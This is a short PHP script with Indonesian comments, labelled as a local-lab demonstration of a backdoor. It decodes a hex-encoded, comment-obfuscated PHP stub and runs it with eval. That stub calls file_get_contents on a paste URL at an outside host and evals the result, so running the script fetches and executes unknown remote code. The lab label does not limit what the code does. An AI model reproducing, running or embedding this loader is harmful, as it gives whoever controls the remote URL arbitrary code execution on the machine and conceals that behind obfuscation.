<?php
// hex_eval.php — HANYA UNTUK LAB LOKAL
// Eksekusi isi $hex (seperti backdoor asli)

if (PHP_SAPI !== 'cli') {
    die("ERROR: Hanya boleh dijalankan via CLI (terminal)!\n");
}

// === INI STRING HEX KAMU ===
$hex = '\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x0a\x20\x20\x20\x20\x2f\x2a\x5f\x2a\x2a\x2f\x20\x75\x72\x6c\x64\x65\x63\x6f\x64\x65\x28\x22\x25\x33\x66\x25\x33\x65\x22\x29\x20\x2e\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73\x28\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x5f\x2a\x2a\x2f\x20\x75\x72\x6c\x64\x65\x63\x6f\x64\x65\x28\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2f\x2a\x5f\x2a\x2a\x2f\x20\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x74\x61\x70\x66\x75\x73\x65\x2e\x69\x6f\x2f\x72\x61\x77\x2f\x68\x61\x78\x31\x2e\x74\x78\x74\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x29\x0a\x20\x20\x20\x20\x29\x3b\x20\x3f\x3e';

echo "Menggunakan string hex asli...\n";

// === DECODE HEX KE KODE PHP ===
$code = preg_replace_callback('/\\\\x([0-9a-fA-F]{2})/', function($m) {
    return chr(hexdec($m[1]));
}, $hex);

echo "Hex berhasil didecode (" . strlen($code) . " bytes)\n\n";
echo "=== KODE YANG DIEKSEKUSI ===\n";
echo $code . "\n";
echo "============================\n\n";

echo "Mengeksekusi...\n\n";

// === EKSEKUSI KODE DARI HEX ===
ob_start();
eval($code);  // Ini akan menjalankan file_get_contents() + eval() seperti backdoor
echo ob_get_clean();

echo "\nEksekusi selesai.\n";
